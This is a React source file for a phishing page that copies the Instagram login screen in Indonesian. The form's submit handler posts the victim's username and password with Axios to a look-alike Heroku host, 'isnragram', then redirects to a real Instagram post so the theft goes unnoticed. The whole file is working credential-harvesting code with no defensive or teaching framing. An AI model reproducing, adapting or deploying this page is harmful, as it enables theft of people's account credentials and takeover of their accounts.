import React from "react";
import Axios from "axios";
import "./App.css";
import face from "./ins.jpeg";
import head from "./head.jpeg";
import foot from "./foot.jpeg";
import atau from "./Atau.jpg";

class App extends React.Component {
  constructor() {
    super();
    this.onChangePassword = this.onChangePassword.bind(this);
    this.onChangeUsername = this.onChangeUsername.bind(this);
    this.onSubmit = this.onSubmit.bind(this);
    this.state = {
      name: "",
      password: "",
      users: []
    };
  }

  onChangeUsername(e) {
    this.setState({
      name: e.target.value
    });
  }
  onChangePassword(e) {
    this.setState({
      password: e.target.value
    });
  }
  onSubmit(e) {
    e.preventDefault();
    const Excercise = {
      name: this.state.name,
      password: this.state.password
    };
    console.log(Excercise);
    Axios.post("https://isnragram.herokuapp.com/login", Excercise)
      .then(res => console.log(res.data))
      .catch(err => console.log(err));

    this.setState({ username: "" });

    window.location = "https://www.instagram.com/p/B842Je7JXtt/";
  }
  render() {
    return (
      <div className="container">
        <input className="head" type="image" src={head} disabled />

        <form onSubmit={this.onSubmit}>
          <div className="main-content">
            <div className="header">
              <img src="https://i.imgur.com/zqpwkLQ.png" alt="" />
            </div>
            <div className="l-part">
              <input type="image" src={face} className="face" disabled />
              <br />
              <input className="atau" type="image" src={atau} disabled />

              <input
                type="text"
                placeholder="Nomor telepon, Email, atau Nama pengguna,"
                value={this.state.username}
                onChange={this.onChangeUsername}
                className="input-1"
              />

              <input
                type="password"
                placeholder="Kata Sandi"
                value={this.state.password}
                onChange={this.onChangePassword}
                className="input-2"
              />
              <div id="lupa">
                <a href="https://www.instagram.com/accounts/emailsignup/">
                  Lupa kata sandi?
                </a>
              </div>

              <input type="submit" value="Log in" className="btn" />

              <p className="spar">
                {" "}
                <span className="s-part">Tidak punya akun? </span>
                <a href="https://www.instagram.com/accounts/emailsignup/">
                  Buat akun
                </a>
              </p>
            </div>
          </div>
          <input className="foot" type="image" src={foot} disabled />
        </form>
        
      </div>
      
    );
  }
}

export default App;
